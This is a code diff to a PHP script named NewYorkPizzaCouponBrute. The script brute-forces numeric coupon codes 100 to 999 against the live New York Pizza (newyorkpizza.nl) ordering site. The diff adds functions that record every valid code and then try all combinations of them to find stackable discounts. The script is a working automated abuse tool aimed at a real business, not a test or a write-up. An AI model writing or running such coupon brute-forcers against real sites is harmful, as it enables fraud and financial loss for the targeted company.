@@ -1,5 +1,4 @@
 <?php
-
 error_reporting(E_ALL | E_STRICT | E_NOTICE);
 ini_set('display_errors', 1);
 
@@ -88,18 +87,10 @@ class NewYorkPizzaCouponBrute
         echo sprintf(' - TOTAL: € %.02f', $this->getOrderTotal()), PHP_EOL;
 
         echo 'Testing coupons:', PHP_EOL;
-        for ($i = 100; $i <= 999; $i += 1) {
-            echo ' - ', $i, ': ';
+        $coupons = $this->testCoupons();
 
-            [$status, $identifier, $discount] = $this->addCoupon($i);
-            echo sprintf('%s %s: € -%.02f', $status, $identifier, $discount), "\r";
-
-            // Remove so we can test more
-            if ($status === self::COUPON_VALID) {
-                $this->removeCoupon($identifier);
-                echo PHP_EOL;
-            }
-        }
+        echo 'Testing coupon combinations:', PHP_EOL;
+        $this->testCouponCombinations($coupons);
 
         echo PHP_EOL;
         exit;
@@ -272,7 +263,7 @@ class NewYorkPizzaCouponBrute
         }
 
         $html = $this->request('https://www.newyorkpizza.nl/Menu/_ReceiptPartial/');
-        $matches =[];
+        $matches = [];
 
         // Get price span from receipt partial
         if (!preg_match('/\<span class="s4d-receipt-price s4d-total-price receipt__text receipt__total-price">€\s*(.+)\s*\<\/span>/', $html, $matches)) {
@@ -285,6 +276,113 @@ class NewYorkPizzaCouponBrute
         }
 
         return $price;
+    }
+
+    private function testCoupons(int $max = 999): array
+    {
+        $coupons = [];
+
+        for ($code = 100; $code <= $max; $code += 1) {
+            echo chr(27) . '[2K', "\r"; // Clear line
+            echo ' - ', $code, ': ';
+
+            [$status, $identifier, $discount] = $this->addCoupon($code);
+            echo sprintf('%s %s: € -%.02f', $status, $identifier, $discount), "\r";
+
+            // Remove so we can test more
+            if ($status === self::COUPON_VALID) {
+                $coupons[$identifier] = $code;
+                $this->removeCoupon($identifier);
+                echo PHP_EOL;
+            }
+        }
+
+        return $coupons;
+    }
+
+    /**
+     * This huge pile of mess is to try if coupon codes can be combined in any
+     * possible combo. Probably not, but who knows...
+     *
+     * @see https://stackoverflow.com/a/65061503/3099003
+     * @param array $codes
+     * @return void
+     */
+    private function testCouponCombinations(array $codes): void
+    {
+        $combinations = $this->getCombinations($codes);
+        $tried_combinations = [];
+
+        foreach ($combinations as $combination) {
+            echo chr(27) . '[2K', "\r"; // Clear line
+            echo '- Combination:';
+
+            // Test if tried [120, 174] is in current [120, 174, 211]
+            $tried = false;
+            foreach ($tried_combinations as $tc) {
+                if ($tc == array_slice($combination, 0, count($tc))) {
+                    $tried = true;
+                    break;
+                }
+            }
+
+            // Allready tried, continue
+            if ($tried) {
+                continue;
+            }
+
+            $discounts = [];
+            foreach ($combination as $code) {
+                echo ' ', $code;
+                [, $identifier, $discount] = $this->addCoupon($code);
+                if (!$discount) {
+                    $tried_combinations[] = $combination;
+                    break;
+                }
+                $discounts[$identifier] = $discount;
+            }
+
+            foreach (array_keys($discounts) as $identifier) {
+                $this->removeCoupon($identifier);
+            }
+
+            if (count($discounts) > 1) {
+                echo '; Woop woop! Mega discount: ', sprintf('€ %.2f', array_sum($discounts)), PHP_EOL;
+            }
+        }
+    }
+
+    private function getCombinations(array $codes, int $min_length = 2): array
+    {
+        // Nothing to do
+        if (count($codes) < $min_length) {
+            return [];
+        }
+
+        asort($codes);
+ 
+        $keys = array_keys($codes);
+        $count = count($codes);
+        $size = pow(2, $count);
+        $combinations = [];
+
+        // Combination magic using bytes, smart...
+        for ($i = 0; $i < $size; $i++) {
+            $bytes = sprintf("%0" . $count . "b", $i);
+            $combo = [];
+
+            for ($j = 0; $j < $count; $j++) {
+                if ($bytes[$j] == '1') {
+                    $combo[$keys[$j]] = $codes[$keys[$j]];
+                }
+            }
+
+            if (count($combo) >= $min_length) {
+                $combinations[] = $combo;
+            }
+        }
+
+        return $combinations;
     }
 
     private function request(string $url, array $data = [], bool $is_post = false): string
@@ -366,7 +464,7 @@ if (!$json) {
         ['product' => 93, 'option' => 8, 'quantity' => 1],
         // Double Tasty - Hawaii / Salami - 35cm NY Style
         ['slices' => [92, 262], 'option' => 3, 'quantity' => 1],
-        ]), '\'', PHP_EOL;
+    ]), '\'', PHP_EOL;
     echo '  -  : php -f ', __FILE__, ' products.json', PHP_EOL;
     echo PHP_EOL;
 
